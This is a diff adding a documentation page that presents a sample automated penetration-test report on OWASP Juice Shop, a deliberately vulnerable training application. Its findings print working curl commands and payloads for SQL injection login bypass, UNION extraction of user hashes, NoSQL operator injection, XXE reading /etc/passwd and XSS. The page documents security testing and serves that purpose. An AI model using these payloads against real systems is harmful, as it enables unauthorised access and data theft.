@@ -1,0 +1,290 @@
+---
+title: OWASP Juice Shop Report
+description: Shannon discovered 20+ critical vulnerabilities including complete authentication bypass and database exfiltration
+---
+
+## Executive Summary
+
+**Target**: OWASP Juice Shop ([GitHub](https://github.com/juice-shop/juice-shop))  
+**Assessment Date**: September 2025  
+**Scope**: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing
+
+Shannon identified **over 20 high-impact vulnerabilities** across targeted OWASP categories in a single automated run against Juice Shop, a notoriously insecure web application maintained by OWASP for testing security tools.
+
+## Key Accomplishments
+
+### Complete System Compromise
+
+- **Achieved complete authentication bypass** via SQL injection in login endpoint
+- **Exfiltrated entire user database** including admin credentials and password hashes
+- **Executed full privilege escalation** by creating administrator accounts through registration bypass
+- **Discovered Server-Side Request Forgery (SSRF)** enabling internal network reconnaissance
+
+### Verified Vulnerabilities by Category
+
+**Authentication Vulnerabilities:**
+- SQL injection authentication bypass
+- Brute force attacks due to missing rate limiting
+- MD5 password cracking
+- OAuth nOAuth attacks with predictable passwords
+- Account enumeration via reset flows
+- Token replay vulnerabilities
+
+**Authorization Vulnerabilities:**
+- Anonymous access to all user memories
+- Admin role injection during registration
+- Horizontal privilege escalation via IDOR across user profiles, baskets, and feedback
+- Business logic bypasses including deluxe membership payment bypass
+- Cross-user order checkout
+
+**Cross-Site Scripting (XSS):**
+- Reflected XSS in search parameters via Angular security bypass
+- JSONP callback XSS enabling cross-domain attacks
+- Potential stored XSS in admin panels (CAPTCHA-protected)
+
+**SQL/Command Injection:**
+- SQL authentication bypass
+- UNION-based SQL injection for complete database extraction
+- NoSQL operator injection enabling mass data manipulation
+- XXE file disclosure
+- YAML injection DoS attacks
+
+**Server-Side Request Forgery (SSRF):**
+- SSRF in profile image URL upload with HTTP method bypass
+- Cloud metadata endpoint access
+- Network boundary bypass for reconnaissance
+
+## Critical Vulnerability Examples
+
+### INJ-VULN-01: SQL Injection Authentication Bypass
+
+**Severity**: Critical  
+**Location**: `POST /rest/user/login` (email field)  
+**Impact**: Administrative access bypass, complete system compromise
+
+**Exploitation:**
+
+```bash
+curl -X POST http://juice-shop.sandbox.local:3001/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"'\'' OR '\''1'\''='\''1'\'' --","password":"test"}'
+```
+
+**Response:**
+
+```json
+{
+  "authentication": {
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
+    "bid": 1,
+    "umail": "admin@juice-sh.op"
+  }
+}
+```
+
+**Proof of Impact**: Successfully bypassed authentication and obtained admin-level access token for user ID 1 (`admin@juice-sh.op`) with role "admin". This provides complete administrative access to the application.
+
+**Technical Details**: The vulnerability exists at `/routes/login.ts:34` due to direct string interpolation in SQL query construction. The email field accepts arbitrary SQL commands allowing complete database access.
+
+---
+
+### INJ-VULN-02: SQL Injection Data Extraction
+
+**Severity**: Critical  
+**Location**: `GET /rest/products/search` (q parameter)  
+**Impact**: Full user database access including password hashes
+
+**Exploitation:**
+
+```bash
+# Confirm SQL injection vulnerability
+curl -s "http://juice-shop.sandbox.local:3001/rest/products/search?q=test'"
+```
+
+Response: SQL syntax error confirming vulnerability
+
+```bash
+# Extract user credentials using UNION injection
+curl -s "http://juice-shop.sandbox.local:3001/rest/products/search?q=xxx%25%27%29%20AND%20description%20LIKE%20%27%25xxx%25%27%29%20UNION%20SELECT%20id,email,password,role,0,0,0,0,0%20FROM%20Users%20LIMIT%205--"
+```
+
+**Proof of Impact**: Successfully extracted user database containing:
+
+- Admin account: `admin@juice-sh.op` (hash: `0192023a7bbd73250516f069df18b500`, role: admin)
+- User accounts: `jim@juice-sh.op`, `bender@juice-sh.op`, `bjoern.kimminich@gmail.com`, `ciso@juice-sh.op`
+- Password hashes (MD5) for all users
+- Role assignments (admin, customer, deluxe)
+
+**Technical Details**: SQLite database confirmed via error messages. UNION injection requires proper closure of LIKE clauses in both name and description fields.
+
+---
+
+### INJ-VULN-04: NoSQL Operator Injection Mass Data Manipulation
+
+**Severity**: High  
+**Location**: `PATCH /rest/products/reviews` (id field)  
+**Impact**: Complete data integrity compromise - all reviews modified
+
+**Prerequisites**: Valid JWT authentication token
+
+**Exploitation:**
+
+```bash
+curl -X PATCH "http://juice-shop.sandbox.local:3001/rest/products/reviews" \
+  -H "Authorization: Bearer [ADMIN_TOKEN]" \
+  -H "Content-Type: application/json" \
+  -d '{"id":{"$ne":-1},"message":"HACKED - All reviews modified"}'
+```
+
+**Proof of Impact**: Successfully modified 28 reviews in the database using `$ne` (not equal) operator:
+
+- Modified: 28 documents
+- All review messages changed to "HACKED - All reviews modified"
+- Affected reviews from multiple users across different products
+
+**Technical Details**: The `$ne` operator bypassed intended single-document update restrictions due to object injection vulnerability and `{ multi: true }` setting.
+
+---
+
+### INJ-VULN-06: XXE File Disclosure
+
+**Severity**: High  
+**Location**: `POST /file-upload` (XML file content)  
+**Impact**: Sensitive file disclosure from server filesystem
+
+**Prerequisites**: Valid JWT authentication token
+
+**Exploitation:**
+
+Create XML file with external entity payload:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+```
+
+Upload malicious XML file:
+
+```bash
+curl -X POST "http://juice-shop.sandbox.local:3001/file-upload" \
+  -H "Authorization: Bearer [TOKEN]" \
+  -F "file=@xxe_test.xml"
+```
+
+**Proof of Impact**: Successfully extracted `/etc/passwd` file contents:
+
+```
+root:x:0:0:root:/root:/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/sbin/nologin
+nonroot:x:65532:65532:nonroot:/home/nonroot:/sbin/nologin
+```
+
+**Technical Details**: XXE vulnerability confirmed via `libxml.parseXml()` with `noent: true` configuration enabling external entity processing.
+
+---
+
+### XSS-VULN-01: Reflected XSS in Search Parameter
+
+**Severity**: Medium  
+**Location**: `http://juice-shop.sandbox.local:3001/#/search?q=[PAYLOAD]`  
+**Impact**: JavaScript execution in victim's browser, session token access, phishing
+
+**Prerequisites**: None - publicly accessible
+
+**Exploitation:**
+
+Navigate to:
+```
+http://juice-shop.sandbox.local:3001/#/search?q=<img src=x onerror=alert('XSS')>
+```
+
+**Proof of Impact**: Immediate JavaScript execution via alert dialog displaying "XSS" message. The payload `<img src=x onerror=alert('XSS')>` was injected without any sanitization.
+
+**Technical Details**: Attack works because Angular's `bypassSecurityTrustHtml()` method explicitly bypasses XSS protection for search result display. Can be used for session hijacking by replacing alert with cookie exfiltration code.
+
+---
+
+### XSS-VULN-02: JSONP Callback XSS
+
+**Severity**: Medium  
+**Location**: `http://juice-shop.sandbox.local:3001/rest/user/whoami?callback=[PAYLOAD]`  
+**Impact**: Cross-domain JavaScript execution, data exfiltration, same-origin policy bypass
+
+**Prerequisites**: None
+
+**Exploitation:**
+
+From any web page context:
+
+```javascript
+const script = document.createElement('script');
+script.src = '/rest/user/whoami?callback=alert';
+document.head.appendChild(script);
+```
+
+**Proof of Impact**: JavaScript execution via alert dialog displaying "[object Object]" containing user data. The JSONP endpoint generates response: `/**/ typeof alert === 'function' && alert({"user":{}});`
+
+**Technical Details**: Enables cross-domain attacks and user data exfiltration. Attackers can host malicious pages that include this endpoint as a script source to steal user information.
+
+---
+
+### AUTH-VULN-06: SQL Injection Authentication Bypass
+
+**Severity**: Critical  
+**Location**: `POST /rest/user/login` endpoint  
+**Impact**: Admin account takeover and full user database access
+
+**Exploitation:**
+
+```bash
+curl -X POST "http://juice-shop.sandbox.local:3001/rest/user/login" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op'\'' OR 1=1-- ","password":"anything"}'
+```
+
+**Response:**
+
+```json
+{
+  "authentication": {
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
+    "bid": 1,
+    "umail": "admin@juice-sh.op"
+  }
+}
+```
+
+**Proof of Impact**: Complete admin authentication bypass with valid JWT token providing full access to administrative functions.
+
+## Report Access
+
+View the complete penetration test report with all vulnerability details:
+
+[View Full Report →](https://github.com/KeygraphHQ/shannon/blob/main/sample-reports/shannon-report-juice-shop.md)
+
+## Application Details
+
+**OWASP Juice Shop** is a modern, intentionally insecure web application designed by OWASP to test security tools and train security professionals. It includes vulnerabilities across all OWASP Top 10 categories.
+
+- **GitHub**: [juice-shop/juice-shop](https://github.com/juice-shop/juice-shop)
+- **Purpose**: Security tool testing and training
+- **Technology**: Node.js, Express, Angular, SQLite
+- **Vulnerability Count**: 100+ intentional security flaws
+
+## Key Takeaways
+
+Shannon's performance on Juice Shop demonstrates:
+
+1. **Comprehensive Discovery**: Identified 20+ vulnerabilities across all tested OWASP categories
+2. **Proof-Based Validation**: Every finding includes working exploit code and actual impact evidence
+3. **Critical Path Exploitation**: Successfully chained vulnerabilities for complete system compromise
+4. **Zero False Positives**: Only verified, exploitable vulnerabilities reported
+5. **Autonomous Operation**: Complete assessment without human intervention
+
+## Next Steps
+
+- [View c{api}tal API Report](/reports/capital-api): API-specific vulnerabilities
+- [View crAPI Report](/reports/crapi): Advanced JWT and API security testing
+- [View Benchmark Results](/reports/benchmark-results): 96.15% success on XBOW benchmark
+- [Get Started with Shannon](/quickstart): Run your own penetration tests
